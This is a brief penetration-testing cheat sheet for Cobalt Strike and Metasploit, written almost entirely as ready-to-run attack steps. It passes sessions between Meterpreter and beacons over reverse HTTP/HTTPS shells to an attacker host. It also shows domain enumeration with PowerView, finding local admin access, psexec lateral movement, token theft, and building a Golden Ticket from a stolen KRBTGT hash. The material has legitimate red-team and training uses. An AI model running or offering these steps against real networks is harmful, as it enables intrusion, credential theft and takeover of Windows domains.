# Cobalt Strike

Move a meterpreter / metasploit session to Cobalt

\(Spawn Beacon from Meterpreter\)

```
in Cobalt
setup a listener
windows/beacon_http/reverse_http

in Metasploit
use exploit/windows/local/payload_inject
set PAYLOAD windows/meterpreter/reverse_http
set LHOST [IP of Cobalt Strike Listenter]
set LPORT 80
set session 1
set DisablePayloadHandler True
exploit (-j)
```

Move a Cobalt beacon to Metasploit

\(Spawn Meterpreter from Beacon\)

```
in Metasploit
use exploit/multi/handler
set PAYLOAD windows/meterpreter/reverse_https
set LHOST ATTACKINGIP
set LPORT 443
set ExitOnSession False
exploit (-j)

in Cobalt
setup a foreign listener
windows/foreign/reverse_https
Right Click Beacon-->Spawn-->Select foreign beacon

Note: Cobalt will spawn an x86 shell, for any post exploit modules make sure to migrate to an x64 process like svchost
if applicable
```

View targets available from Initial Target

```
Right Click Target --> Explore -->Net View
or
Net computers
net dclist

```

Find where we are a local admin

```
beacon: powershell-import /root/PowerTools/PowerView/powerview.ps1
beacon: Invoke-FindLocalAdminAccess
```

Login to target where we are local admin

```
Right Click Target -->Login -->psexec (change Listener to SMB beacon)(choose a session)
(user session's current token)
```

Get token from processes

```
Right Click Target -->Explore-->Process List-->Steal Token
```

Create Multiple beacons on targets

```
Select the targets --> Right Click -->Login -->psexec --> choose a beacon with an elevated token-->
(user session's current token)-->Launch
```

Golden Ticket Generation

```
Need four items
1)User
2)Domain
3)Domain SID
4)KRBTGT Hash

3) shell whoami /user to obtain SID (also provides 1 & 2)
4) obtained from a previous compromise (i.e. NTLM hashdump)

With that Right Click-->Access-->Golden Ticket-->Input Four fields-->Build

Verify it works: #shell dir \\[DC]\C$
```



